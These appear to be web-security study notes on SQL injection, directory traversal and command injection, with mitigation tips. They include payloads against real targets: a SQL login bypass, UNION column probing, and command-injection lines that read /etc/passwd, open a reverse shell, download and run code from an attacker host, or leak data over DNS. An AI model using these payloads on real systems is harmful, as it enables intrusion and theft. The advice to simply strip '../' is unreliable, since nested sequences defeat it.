# SQL INJECTIOn


#### Manual SQLi Detection

- The single quote character `'` and look for errors or other anomalies.
- Some SQL-specific syntax that evaluates to the base (original) value of the entry point, and to a different value, and look for systematic differences in the application responses.
- Boolean conditions such as `OR 1=1` and `OR 1=2`, and look for differences in the application's responses.
- OAST payloads designed to trigger an out-of-band network interaction when executed within a SQL query, and monitor any resulting interactions.

#### SQL injection in different parts of the query
Most SQL injection vulnerabilities occur within the `WHERE` clause of a `SELECT` query.
Some other common locations where SQL injection arises are: 
- In `UPDATE` statements, within the updated values or the `WHERE` clause. 
- In `INSERT` statements, within the inserted values. 
- In `SELECT` statements, within the table or column name. 
- In `SELECT` statements, within the `ORDER BY` clause.

> ***Warning!***    Take care when injecting the condition `OR 1=1` into a SQL query. Even if it appears to be harmless in the context you're injecting into, it's common for applications to use data from a single request in multiple different queries. If your condition reaches an ***`UPDATE`*** or ***`DELETE`*** statement, for example, it can result in an accidental loss of data.

#### SQLi for user login with Username and Password credentials
SQL Query includes: `SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'`
Using the SQL comment sequence `--` to remove the password check from the `WHERE` clause of the query: `SELECT * FROM users WHERE username = 'administrator'--' AND password = ''`


### Types of SQLi

#### 1. In-Band SQLi  
   - A. Union-Based SQLi  
   - B. Error-Based SQli  
#### 2. Inferential/Blind SQLi  
   - A. Boolean-Based SQLi  
   - B. Time-Based SQli
#### 3. Out-of-Band SQLi


#### A. Union-Based SQLi
- Effective when the SQL query results are returned to the application's response. It's useful when you need to combine the results of multiple `SELECT` statements into a single result set, which the application might display.
- Used to extract data from the database such as retrieving usernames, passwords, or other sensitive information.
-  The `UNION` keyword enables you to execute one or more additional `SELECT` queries and append the results to the original query.
-  For example:
> SELECT a, b FROM table1 UNION SELECT c, d FROM table2

**For a UNION query to work, two key requirements must be met:**
    - The individual queries must return the same number of columns.
    - The data types in each column must be compatible between the individual queries.

**Meet these two requirements to carry out attack:**
    - How many columns are being returned from the original query.
    - Which columns returned from the original query are of a suitable data type to hold the results from the injected query.

## Determining the number of columns required

Two effective methods to determine how many columns are being returned from the original query.

1. Injecting a series of `ORDER BY` clauses and incrementing the specified column index until an error occurs. For example, if the injection point is a quoted string within the `WHERE` clause of the original query, you would submit:
  > ' ORDER BY 1--
  > ' ORDER BY 2--
  > ' ORDER BY 3--
  etc.

This series of payloads modifies the original query to order the results by different columns in the result set. The column in an `ORDER BY` clause can be specified by its index, so you don't need to know the names of any columns. When the specified column index exceeds the number of actual columns in the result set, the database returns an error, such as:

> The ORDER BY position number 3 is out of range of the number of items in the select list.

The application might actually return the database error in its HTTP response, but it may also issue a generic error response. In other cases, it may simply return no results at all. Either way, as long as you can detect some difference in the response, you can infer how many columns are being returned from the query. 

2. Second method involves submitting a series of `UNION SELECT` payloads specifying a different number of null values:
  > ' UNION SELECT NULL--
  > ' UNION SELECT NULL,NULL--
  > ' UNION SELECT NULL,NULL,NULL--
  etc.

If the number of nulls does not match the number of columns, the database returns an error, such as:

- All queries combined using a `UNION`, `INTERSECT` or `EXCEPT` operator must have an equal number of expressions in their target lists.

We use `NULL` as the values returned from the injected `SELECT` query because the data types in each column must be compatible between the original and the injected queries. `NULL` is convertible to every common data type, so it maximizes the chance that the payload will succeed when the column count is correct.

As with the `ORDER BY` technique, the application might actually return the database error in its `HTTP response`, but may return a generic error or simply return no results.  
When the number of nulls matches the number of columns, the database returns an additional row in the result set, containing null values in each column. The effect on the HTTP response depends on the application's code. If you are lucky, you will see some additional content within the response, such as an extra row on an HTML table. Otherwise, the null values might trigger a different error, such as a `NullPointerException`. In the worst case, the response might look the same as a response caused by an incorrect number of nulls. This would make this method ineffective. 

#### Database-specific syntax

On Oracle, every `SELECT` query must use the `FROM` keyword and specify a valid table. There is a built-in table on Oracle called `dual` which can be used for this purpose. So the injected queries on Oracle would need to look like:

> ' UNION SELECT NULL FROM DUAL--

The payloads described use the double-dash comment sequence `--` to comment out the remainder of the original query following the injection point. 

On MySQL, the `double-dash` sequence must be followed by a space. Alternatively, the hash character `#`` can be used to identify a comment.

For more details of database-specific syntax, see the [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)


---
***
___

# DIRECTORY TRAVERSAL

- A Path traversal attack.
- Occurs when paths are constructed using unsanitized user inputs.
- By controlling path construction, it enables to walk up the filesystem tree and control where files are being read/written.  

On most OSes, there are two special directories: `.` and `..`.  Where `.` is always the present directory and `..` is the parent directory.  

For example, a simple script: take the `GET` parameter `file`, append that to the path `/var/www/sandbox/uploads/`, then read that file and echo it to the page.

#### Impact

- A directory traversal attack allows an attacker to access files and directories stored outside the web root folder by manipulating and exploiting improper file path validations.
- Allow reading any file on the server that the webserver process has permissions to read.
- This could reveal code, DB files, personal information, account details, etc etc.
- In worst case scenario, it may lead to decode execution or even privilege escalation.

- Consider a site that allows to upload and share documents. When sending HTTP multipart file upload, your client passes the filename to the server for processing.
- Inserting Directory traversal payload in this filename may allow to arbitrarily write files on the server.
- Eg. > ../../../../../var/www/public/definitely_not_malicious.php

#### Mitigation

- One of the easiest vulnerabilities to mitigate, though it exists all over.
- Two ways to directly mitigate,
        - Don't allow path separaters `/` and `\` at all, if users shouldn't be able to *read/write/access* files outside the path being specified.
        - Simply strip instances of `../` or `..\` from paths.
- Generate a filename based on the *extension/MIME-type* of the file, an MD5 of the contents, etc.


---


# COMMAND INJECTION

Scenario: You're testing an appliance with a web interface for administration. As part of this interface, you have access to a ping function, to test its ability to call out. You tell it to `ping google.com` and you see:
```
PING google.com (172.217.3.14): 56 data bytes
64 bytes from 172.217.3.14: imp_seq=0  ttl=53 time=19.187 ms
64 bytes from 172.217.3.14: imp_seq=1  ttl=53 time=17.341 ms
64 bytes from 172.217.3.14: icmp_seq=2 ttl=53 time=14.355 ms
64 bytes from 172.217.3.14: icmp_seq=3 ttl=53 time=15.116 ms
```
- It definitely looks similar to the output of the `ping` command in UNIX-like systems. Maybe server is running actual `ping` and directly passing the `hostname` on the command line.
- In such a case, it may lead to execute other commands.

- Try to ping the hostname with
> google.com; echo test

- If it just returns an empty page with the use of `;` and `&`, it's vulnerable.

***Backticks (````)***:
Backtick allows to embed a subcommand, whos output gets embedded into the original command.
Eg, ``ping `echo google.com` `` will work just like `ping google.com`

- If this gets successfully executed, you own the system.


#### Mitigation

- Never embed user data into a command line at all.
- If you must, then use shell escaping, eg. `escapeshellcmd()` in PHP
- The function escapes #&;`|*?~<>^(){}[]$\, \x0A, \xFF, and any unbalanced quotes.
- Note that this doesn't prevent use of spaces, so if the user input isn't quoted, it could very well add new arguments to the command, which can be enough to own a system in some cases.

#### Command Injection Payloads (*Linux*)

1. Simple Command Injection 
```BASH
; ls -la
```
2. Command Chaining with `&&`
```BASH
&& whoami
```
3. Command Substitution with Backticks
```BASH
`whoami`
```
4. Command Substitution with `$()`
```BASH
$(whoami)
```
5. Command Injection with Pipes `|`
```BASH
| whoami
```

#### Command Injection Payload (Windows)

1. Simple Command Injection
```BASH
& dir
```
2. Command Chaining with `&&`
```BASH
&& whoami
```
3. Command Injection with Pipes `|`
```BASH
| whoami
```
4. Command Injection with `^` 
```BASH
^& dir
```

#### Advanced Payloads

1. Retrieve `/etc/passwd` File (Linux)
```BASH
; cat /etc/passwd
```
2. Reverse Shell (Linux)
```BASH
; bash -i >& /dev/tcp/attacker_ip/attacker_port 0>&1
```
3. Reverse Shell (Windows)
```BASH
& powershell IEX (New-Object Net.WebClient).DownloadString('http://attacker_ip/shell.ps1')
```
4. Bypass Filters with Hex Encoding (Linux)
```BASH
; echo -e '\x63\x61\x74 /etc/passwd'
```
5. Chained Commands to Download a File (Linux)
```BASH
; wget http://attacker_ip/malicious_file
```
6. DNS Exfiltration (Linux)
```BASH
; nslookup `whoami`.attacker.com
```

#### Common Bypass Techniques

1. Whitespace Bypass
```BASH
;$(echo${IFS}whoami)
```
2. URL-Encoding Bypass
```BASH
%3B%20whoami
```
























